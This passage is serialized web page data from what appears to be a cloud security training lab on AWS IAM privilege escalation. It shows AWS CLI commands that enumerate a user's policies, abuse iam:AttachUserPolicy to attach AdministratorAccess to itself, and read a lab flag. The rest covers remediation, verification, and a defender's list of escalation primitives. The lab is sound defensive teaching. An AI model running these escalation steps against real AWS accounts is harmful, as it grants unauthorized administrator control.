an this identity do?\"}]\n8:[\"$\",\"pre\",\"pre-1\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-bash\",\"children\":\"aws iam list-attached-user-policies --user-name pipeline-deployer --profile attacker\\n\\n# Read the policy itself - find the default version, then dump it\\naws iam get-policy --policy-arn <VulnerablePolicyArn> --profile attacker\\naws iam get-policy-version --policy-arn <VulnerablePolicyArn> \\\\\\n  --version-id v1 --profile attacker\\n\"}]}]\n9:[\"$\",\"p\",\"p-4\",{\"children\":[\"Read every \",[\"$\",\"code\",\"code-0\",{\"children\":\"Action\"}],\". The \",[\"$\",\"code\",\"code-1\",{\"children\":\"LooksLikeANormalDeployer\"}],\" statement is harmless reads —\\nbut the \",[\"$\",\"strong\",\"strong-0\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"BuildHelpers\"}]}],\" statement grants \",[\"$\",\"code\",\"code-2\",{\"children\":\"iam:AttachUserPolicy\"}],\" on \",[\"$\",\"code\",\"code-3\",{\"children\":\"Resource: \\\"*\\\"\"}],\".\"]}]\na:[\"$\",\"h2\",\"h2-4\",{\"children\":\"Step 2 — Why that one line is game over\"}]\nb:[\"$\",\"p\",\"p-5\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"children\":\"iam:AttachUserPolicy\"}],\" lets an identity attach \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"any\"}],\" managed policy to a user —\\nincluding itself, and including AWS's \",[\"$\",\"code\",\"code-1\",{\"children\":\"AdministratorAccess\"}],\". A \\\"limited\\\" user that\\ncan call it is, in practice, an administrator.\"]}]\nc:[\"$\",\"h2\",\"h2-5\",{\"children\":\"Step 3 — Exploit: escalate and capture the flag\"}]\nd:[\"$\",\"pre\",\"pre-2\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-bash\",\"children\":\"# Confirm you can't read the flag yet (no ssm perms)\\naws ssm get-parameter --name /shieldsync/lab/flag --profile attacker\\n# -> AccessDenied\\n\\n# Escalate: attach AdministratorAccess to yourself\\naws iam attach-user-policy --user-name pipeline-deployer \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile attacker\\n\\n# You are now admin - read the flag\\naws ssm get-parameter --name /shieldsync/lab/flag --profile attacker --query Parameter.Value --output text\\n# -> SHIELDSYNC{priv-esc-via-iam-AttachUserPolicy}\\n\"}]}]\ne:[\"$\",\"p\",\"p-6\",{\"children\":\"That flag is your proof the path is real. Now shut it.\"}]\nf:[\"$\",\"h2\",\"h2-6\",{\"children\":\"Step 4 — Remediate (use your admin console/CloudShell, NOT the attacker profile)\"}]\n10:[\"$\",\"p\",\"p-7\",{\"children\":[\"Drop the \",[\"$\",\"code\",\"code-0\",{\"children\":\"--profile attacker\"}],\" from here on — remediate as your own admin identity.\"]}]\n11:[\"$\",\"pre\",\"pre-3\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-bash\",\"children\":\"# 1) Detach the admin you just attached\\naws iam detach-user-policy --user-name pipeline-deployer \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\n\\n# 2) Fix the policy: create a new version WITHOUT the BuildHelpers statement,\\n#    and make it the default. Save the cleaned doc as fixed-policy.json first.\\naws iam create-policy-version --policy-arn <VulnerablePolicyArn> \\\\\\n  --policy-document file://fixed-policy.json --set-as-default\\n\"}]}]\n12:[\"$\",\"p\",\"p-8\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"children\":\"fixed-policy.json\"}],\" (the read statement only — escalation primitive gone):\"]}]\n13:[\"$\",\"pre\",\"pre-4\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-json\",\"children\":\"{ \\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[\\n  { \\\"Sid\\\":\\\"LooksLikeANormalDeployer\\\",\\\"Effect\\\":\\\"Allow\\\",\\n    \\\"Action\\\":[\\\"s3:ListAllMyBuckets\\\",\\\"s3:GetObject\\\",\\\"s3:ListBucket\\\",\\n              \\\"cloudwatch:GetMetricData\\\",\\\"logs:DescribeLogGroups\\\",\\\"logs:GetLogEvents\\\"],\\n    \\\"Resource\\\":\\\"*\\\" } ]}\\n\"}]}]\n14:[\"$\",\"blockquote\",\"blockquote-1\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":[\"IAM managed policies keep max 5 versions. If \",[\"$\",\"code\",\"code-0\",{\"children\":\"create-policy-version\"}],\" complains,\\ndelete the old non-default version with \",[\"$\",\"code\",\"code-1\",{\"children\":\"aws iam delete-policy-version\"}],\".\"]}],\"\\n\"]}]\n15:[\"$\",\"h2\",\"h2-7\",{\"children\":\"Step 5 — Verify the hole is closed\"}]\n16:[\"$\",\"pre\",\"pre-5\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-bash\",\"children\":\"# No admin attached\\naws iam list-attached-user-policies --user-name pipeline-deployer\\n\\n# Prove the user can no longer escalate, but can still do its job\\naws iam simulate-principal-policy \\\\\\n  --policy-source-arn arn:aws:iam::<acct>:user/lab/pipeline-deployer \\\\\\n  --action-names iam:AttachUserPolicy s3:GetObject\\n# -> iam:AttachUserPolicy = implicitDeny,  s3:GetObject = allowed\\n\"}]}]\n17:[\"$\",\"h2\",\"h2-8\",{\"children\":\"Defender's takeaway\"}]\n18:[\"$\",\"p\",\"p-9\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"children\":\"iam:AttachUserPolicy\"}],\", \",[\"$\",\"code\",\"code-1\",{\"children\":\"iam:PutUserPolicy\"}],\", \",[\"$\",\"code\",\"code-2\",{\"children\":\"iam:CreatePolicyVersion\"}],\",\\n\",[\"$\",\"code\",\"code-3\",{\"children\":\"iam:SetDefaultPolicyVersion\"}],\", and \",[\"$\",\"code\",\"code-4\",{\"children\":\"iam:PassRole\"}],\" (with a compute service) are all\\n\",[\"$\",\"strong\",\"strong-0\",{\"children\":\"privilege-escalation primitives\"}],\". Granting any of them on \",[\"$\",\"code\",\"code-5\",{\"children\":\"Resource: \\\"*\\\"\"}],\" quietly\\nmakes a \\\"limited\\\" identity an admin. Scope IAM-write actions to specific resources,\\nor don't grant them at all — and use \",[\"$\",\"code\",\"code-6\",{\"children\":\"simulate-principal-policy\"}],\" in CI to catch it.\"]}]\n19:[\"$\",\"h2\",\"h2-9\",{\"children\":\"Cleanup\"}]\n1a:[\"$\",\"p\",\"p-10\",{\"children\":[\"Nothing to do — the account is wiped (\",[\"$\",\"code\",\"code-0\",{\"children\":\"aws-nuke\"}],\") and recycled when your session ends.\"]}]\n1b:[\"$\",\"div\",null,{\"className\":\"lg:col-span-1\",\"children\":[\"$\",\"div\",null,{\"className\":\"lg:sticky lg:top-6\",\"children\":[[\"$\",\"$L1e\",null,{\"slug\":\"iam-privilege-escalation\",\"objectives\":[{\"id\":\"admin-detached\",\"description\":\"AdministratorAccess (or any admin-equivalent managed/inline policy) is no longer attached to pipeline-deployer.\"},{\"id\":\"escalation-primitive-removed\",\"description\":\"The LabDeployerPolicy default version no longer grants iam:AttachUserPolicy (or other IAM write actions) on Resource '*'.\"},{\"id\":\"deployer-still-works\",\"description\":\"The user keeps its legitimate read permissions (it shouldn't be lobotomised to nothing).\"}],\"ready\":true}],[\"$\",\"div\",null,{\"className\":\"mt-3 flex flex-wrap gap-1.5\",\"children\":[[\"$\",\"span\",\"IAM\",{\"className\":\"rounded-md border border-line px-2 py-0.5 font-mono text-xs text-muted\",\"children\":\"IAM\"}],[\"$\",\"span\",\"Privilege Escalation\",{\"className\":\"rounded-md border border-line px-2 py-0.5 font-mono text-xs text-muted\",\"children\":\"Privilege Escalation\"}],[\"$\",\"span\",\"Least Privilege\",{\"className\":\"rounded-md border border-line px-2 py-0.5 font-mono text-xs text-muted\",\"children\":\"Least Privilege\"}]]}]]}]}]\n1c:[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/3-kvj8gfht59g.js\",\"async\":true}]\n1d:[\"$\",\"$L1f\",null,{\"children\":[\"$\",\"$20\",null,{\"name\":\"Next.MetadataOutlet\",\"children\":\"$@21\"}]}]\n21:null\n","/labs/$d$slug":"1:\"$Sreact.fragment\"\n2:I[39756,[\"/_next/static/chunks/1k7z9_rdqaoj6.js\",\"/_next/static/chunks/14mrh2-p_w84d.js\"],\"default\"]\n3:I[37457,[\"/_next/static/chunks/1k7z9_rdqaoj6.js\",\"/_next/static/chunks/14mrh2-p_w84d.js\"],\"default\"]\n4:[]\n0:{\"rsc\":[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\"